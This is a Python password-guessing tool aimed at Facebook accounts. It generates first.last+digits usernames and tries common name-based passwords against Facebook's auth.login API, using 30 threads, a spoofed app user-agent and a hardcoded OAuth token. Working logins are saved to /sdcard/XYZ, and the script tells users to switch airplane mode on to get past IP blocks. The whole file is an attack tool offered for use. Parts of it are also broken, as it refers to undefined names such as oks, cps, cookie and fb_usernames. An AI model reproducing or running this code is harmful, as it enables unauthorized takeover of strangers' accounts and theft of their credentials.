#!/usr/bin/python3 
#Coded by : Alif Nurdin Afizayen
#Github : https://github.com/SyachPutra78 
#Facebook : www.facebook.com/AlifXyz78 
###--------------------[BASIC MODULES]----------------###
import os,random,uuid,httpx,json,sys,string,time
from concurrent.futures import ThreadPoolExecutor as SyachPutra78 

###--------------------[BASIC COLORS]----------------###
C = "\033[0;96m"
P = "\033[0;97m"
###--------------------[CHANING COLORS]----------------###
colors = ["\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]

###--------------------[TERMUX SESSION NAME]----------------###
sys.stdout.write('\x1b]2; XYZ - FAMILY_USERNAMES🇮🇩😘 \x07')


###--------------------[LOOP]----------------###
successfull=[]
checkpoint=[]
loop=0

os.system("clear");print("\n\t join our Facebook 🇮🇩😘");time.sleep(2)
os.system('xdg-open https://www.facebook.com/AlifXyz78?mibextid=kFxxJD')
  
###--------------------[MAIN LOGO]----------------###
logo=f"""\033[1;37m
♦️░░▓█▀▀░░▓█░░░█░░▓█░​░♦️🇫​​🇦​​🇲​​🇮​​🇱​​🇾​♦️
♦️░░▓█▃▃░░▓█░░░█░░▓█░░♦️🇺​​🇳​​🇮​​🇰​​🇪​​🇷​​🇸​♦️
♦️░░▓█░░░░▓█▃▃▃█░░▓█░░♦️🇮​​🇳​​🇩​​🇴​​🇳​​🇪​​🇸​​🇮​​🇦​♦️

\033[0;97m        [ Facebook ids cloning by Family usernames ] 
{50 * '-'}
Author   : Alif Nurdin Afizayen
Github   : https://github.com/SyachPutra78 
Facebook : https://www.facebook.com/AlifXyz78?mibextid=kFxxJD
{50 * '-'}"""

###--------------------[MAIN MENU]----------------###

def family_usernames():
    os.system('clear');print(logo)
    user=[]
    print(f"{C}For Example : rusman, andika, ferdy, shinta, amelia, erwin, wulan ,yanti susi")
    first = input(f'{P}First Name : ')
    print(f"{C}For Example : pratama, amelia, saputra, ningrum ,dewi ,suryanti ,susilawati")
    last = input(f'{P}Last Name :  ')
    period = '.'
    try:
        print(f"{C}For Example : 1000, 2000, 5000, 10000 ")
        limit=int(input(f'{P}How Many Usernames Do You Want To Add ? : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with SyachPutra78 (max_workers=30) as XYZ:
        total=str(len(user))
        os.system("clear");print(logo)
        print(f"{P}Use airplane mode to unblock ip")
        print(f"Ids will be saved in /sdcard/XYZ")
        print(50 * '-')
        print('Total ids: '+total)
        print(f"User Name: {first} {last}")
        print(f"CP ids open after 10 days") 
        print(50 * '-')
        for digitx in user:
            username=first+period+last+digitx
            pswrd = [first,last,first+last,first+'123',first+'1234',first+'12345',last+'123',last+'1234',last+'12345']
            XYZ.submit(processcrack,username,pswrd,total)
    print(50 * '\033[0;97m-')
    print('Program finished! ')
    print(f"Total OK; {len(oks)}") 
    print(f"Total OK; {len(cps)}")
    print(50 * '-')
    input(" [ PRESS ENTER TO BACK ] ") 
    fb_usernames()
    

###--------------------[DEF CRACK USERNAMES]----------------###   

def processcrack(username,pswrd,total):
    global successfull
    global checkpoint
    global loop
    try:
        for password in pswrd:
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            connection={'adid': adid,
           'format': 'json',
           'device_id': device_id,
           'email': username,
           'password': password, 
           'generate_analytics_claims': '1',
           'credentials_type': 'password',
           'source': 'login', 
           'error_detail_type': 'button_with_disabled',
           'enroll_misauth': 'false', 
           'generate_session_cookies': '1',
           'generate_machine_id': '1',
           'meta_inf_fbmeta': '', 
           'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/39.0.0.2424;FBBV/4475870;[FBAN/FB4A;FBAV/226.0.0.49.120;FBBV/159526646;FBDM/{density=1.5,width=720,height=1244};FBLC/en_GB;FBRV/0;FBCR/Telenor PK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J100H;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': '21435', 
            'X-FB-Net-HNI': '35793',
            'X-FB-SIM-HNI': '37855', 
            'X-FB-Connection-Type': 'unknown', 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger'}
            login_url='https://api.facebook.com/method/auth.login'
            req=httpx.post(login_url,data=connection,headers=header).json()
            if 'session_key' in req:
                print(f'\r\033[1;92m[OK] '+username+' | '+password)
                print(f'{P}{cookie}')
                open('/sdcard/XYZ/USERNAME_OK.txt', 'a').write(username+' | '+password+'\n')
                successfull.append(username)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print(f'\r\033[1;93m[CP] '+username+' | '+password)
                open('/sdcard/XYZ/USERNAME_CP.txt', 'a').write(username+' | '+password+'\n')
                checkpoint.append(username)
                break
            else:
                continue
        loop+=1
        x = random.choice(colors)
        sys.stdout.write(f"\r\033[0;97m[{x}{username}\033[0;97m] {total}/{loop}; OK;{len(successfull)} CP;{len(checkpoint)} {'{:.0%}'.format(loop/float(total))} ")
        sys.stdout.flush()
    except:
        pass
        

if __name__=="__main__":
  try:os.mkdir('/sdcard/XYZ')
  except:pass
  family_usernames()
  
###--------------------[THE END]----------------###
    
